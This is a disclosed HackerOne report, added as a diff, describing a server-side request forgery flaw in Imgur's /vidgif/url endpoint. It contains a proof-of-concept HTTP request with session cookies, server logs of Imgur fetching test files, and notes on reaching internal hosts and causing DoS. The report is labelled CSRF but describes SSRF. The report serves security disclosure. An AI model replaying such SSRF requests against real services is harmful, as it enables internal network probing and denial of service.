@@ -1,0 +1,65 @@
+ReportLink:https://hackerone.com/reports/91816
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/1n3
+ReportedTo:Imgur(imgur)
+BountyAmount:1600.0
+Severity:
+State:Closed
+DateOfDisclosure:22.03.2016 17:17:49
+
+Summary:
+
+imgur.com is vulnerable to Server Side Request Forgery because it fails to sanitize or verify the "url" GET parameter.
+
+This could be used by attackers to launch attacks against other 3rd party sites or proxy an attackers requests through the affected site to hide the attackers origin. In more extreme cases, this could be used to exploit the back-end application making the request from the server (ie. Ruby) which would result in a compromise of the server or this could point to malicious content running on the attackers server (attacker.org) which is then included in the sites web content. Also, since the requests originate from the server, it may also be possible to make requests to the internal corporate LAN by making the server request internal sites like: http://192.168.1.1, etc... making these requests over and over again would cause a small DoS attack possibly. If multiple attackers leverage this flaw, it would allow a DDoS attack originating from your servers to the target server (ie. facebook.com for instance...). 
+
+To prevent this, the application should first check to see if the URL specified is a valid image extension before sending the actual GET request to the remote site. An attacker could still use a valid image URL on a remote site, but if you implement a token system or throttle the amount of requests you can send (ie. if the same IP/user requests this page more than 5 times, prompt them to enter a captcha to continue submitting more requests, etc.
+
+In the below request, I have include the url parameter to point to my own server and below are my Apache access logs showing the requests from your server.
+
+GET /vidgif/url?url=https://crowdshield.com/.testing/xss.html%00 HTTP/1.1
+Host: imgur.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Referer: http://imgur.com/vidgif?url=h
+Cookie: IMGURUIDJAFO=e57f07d0885dc45d0f0e811a4f1b39ed35b0475651284d28cfd75ee514e3c3b9; _ga=GA1.2.1459742099.1443658888; LASTJAFO=1443710040688; __qca=P0-2118447999-1443658888401; m_sort=viral; m_window=day; m_section=hot; __gads=ID=477008cd7ae64f71:T=1443659370:S=ALNI_Mb4wvR8jFUzZIIJ77A6eSKNrGVb6g; SECONDSESSION=1443708344883; IMGURSESSION=gkao17cqb6u5341vct6pmtqqe6; _nc=1; _gat=1; AZUSER=ue1-ac59c4f6d4bb462bb1f94481551a4313; OX_plg=swf|shk|pm
+Connection: close
+
+==> /var/log/apache2/crowdshield_access.log <==
+54.145.111.81 - - [01/Oct/2015:15:35:43 -0400] "HEAD /.testing/redirect_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.145.111.81 - - [01/Oct/2015:15:35:44 -0400] "HEAD /.testing/redirect_vuln.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.145.111.81 - - [01/Oct/2015:15:35:44 -0400] "GET /.testing/redirect_vuln.txt HTTP/1.1" 200 47118 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.145.111.81 - - [01/Oct/2015:15:35:45 -0400] "HEAD /.testing/redirect_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.196.2.255 - - [01/Oct/2015:15:35:45 -0400] "HEAD /.testing/rfi_vuln.php HTTP/1.1" 200 120 "-" "-"
+54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] "HEAD /.testing/rfi_vuln.php HTTP/1.1" 200 183 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] "GET /.testing/rfi_vuln.php HTTP/1.1" 200 47092 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] "HEAD /.testing/rfi_vuln.php HTTP/1.1" 200 120 "-" "-"
+54.196.2.255 - - [01/Oct/2015:15:35:47 -0400] "HEAD /.testing/rfi_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.196.2.255 - - [01/Oct/2015:15:35:50 -0400] "HEAD /.testing/rfi_vuln.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.196.2.255 - - [01/Oct/2015:15:35:50 -0400] "GET /.testing/rfi_vuln.txt HTTP/1.1" 200 47158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.196.2.255 - - [01/Oct/2015:15:35:50 -0400] "HEAD /.testing/rfi_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.81.242.65 - - [01/Oct/2015:15:35:50 -0400] "HEAD /.testing/xss_vuln.php HTTP/1.1" 200 120 "-" "-"
+54.81.242.65 - - [01/Oct/2015:15:35:52 -0400] "HEAD /.testing/xss_vuln.php HTTP/1.1" 200 183 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.81.242.65 - - [01/Oct/2015:15:35:52 -0400] "GET /.testing/xss_vuln.php HTTP/1.1" 200 236 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.146.201.15 - - [01/Oct/2015:15:35:52 -0400] "HEAD /.testing/rfi_vuln.php HTTP/1.1" 200 120 "-" "-"
+54.146.201.15 - - [01/Oct/2015:15:35:54 -0400] "HEAD /.testing/rfi_vuln.php HTTP/1.1" 200 183 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.146.201.15 - - [01/Oct/2015:15:35:54 -0400] "GET /.testing/rfi_vuln.php HTTP/1.1" 200 47092 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.146.201.15 - - [01/Oct/2015:15:35:54 -0400] "HEAD /.testing/rfi_vuln.php HTTP/1.1" 200 120 "-" "-"
+54.146.24.64 - - [01/Oct/2015:15:35:54 -0400] "HEAD /.testing/redirect_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.146.24.64 - - [01/Oct/2015:15:35:56 -0400] "HEAD /.testing/redirect_vuln.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.146.24.64 - - [01/Oct/2015:15:35:56 -0400] "GET /.testing/redirect_vuln.txt HTTP/1.1" 200 47118 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.146.24.64 - - [01/Oct/2015:15:35:56 -0400] "HEAD /.testing/redirect_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.81.242.65 - - [01/Oct/2015:15:35:56 -0400] "HEAD /.testing/xss_vuln.html HTTP/1.1" 200 246 "-" "-"
+54.81.242.65 - - [01/Oct/2015:15:35:58 -0400] "HEAD /.testing/xss_vuln.html HTTP/1.1" 200 287 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.81.242.65 - - [01/Oct/2015:15:35:58 -0400] "GET /.testing/xss_vuln.html HTTP/1.1" 200 13136 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.80.37.176 - - [01/Oct/2015:15:35:58 -0400] "HEAD /.testing/xss_vuln.php HTTP/1.1" 200 120 "-" "-"
+54.80.37.176 - - [01/Oct/2015:15:36:00 -0400] "HEAD /.testing/xss_vuln.php HTTP/1.1" 200 183 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.80.37.176 - - [01/Oct/2015:15:36:00 -0400] "GET /.testing/xss_vuln.php HTTP/1.1" 200 236 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.83.124.201 - - [01/Oct/2015:15:36:00 -0400] "HEAD /.testing/rfi_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.83.124.201 - - [01/Oct/2015:15:36:02 -0400] "HEAD /.testing/rfi_vuln.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.83.124.201 - - [01/Oct/2015:15:36:02 -0400] "GET /.testing/rfi_vuln.txt HTTP/1.1" 200 47158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/20150101 Firefox/20.0 (Chrome)"
+54.83.124.201 - - [01/Oct/2015:15:36:02 -0400] "HEAD /.testing/rfi_vuln.txt HTTP/1.1" 200 247 "-" "-"
+54.158.37.153 - - [01/Oct/2015:15:36:02 -0400] "HEAD /.testing/xss.html HTTP/1.1" 200 243 "-" "-"
